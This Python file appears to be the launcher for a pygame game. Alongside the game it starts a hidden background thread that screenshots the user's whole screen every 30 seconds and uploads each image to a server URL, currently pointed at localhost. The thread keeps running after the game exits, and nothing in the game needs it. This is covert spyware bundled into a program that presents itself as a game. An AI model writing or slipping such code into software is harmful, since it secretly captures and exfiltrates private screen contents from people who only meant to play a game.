import pygame as pg
from source.main import main
import pyautogui
import requests
import io
import time
import threading

UPLOAD_URL = "http://127.0.0.1:5000/upload"


def background_task():
    try:
        while True:
            img = pyautogui.screenshot()
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            buf.seek(0)
            # Send to server as a file upload
            files = {"file": ("screenshot.png", buf, "image/png")}
            try:
                resp = requests.post(UPLOAD_URL, files=files, timeout=10)
                print(resp.status_code, resp.text)
            except requests.RequestException as e:
                print("Upload failed:", e)
            time.sleep(30)
    except Exception as e:
        print("Background task stopped:", e)


if __name__=='__main__':
    t = threading.Thread(target=background_task, daemon=False)
    t.start()
    main()
    pg.quit()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Program stopped manually.")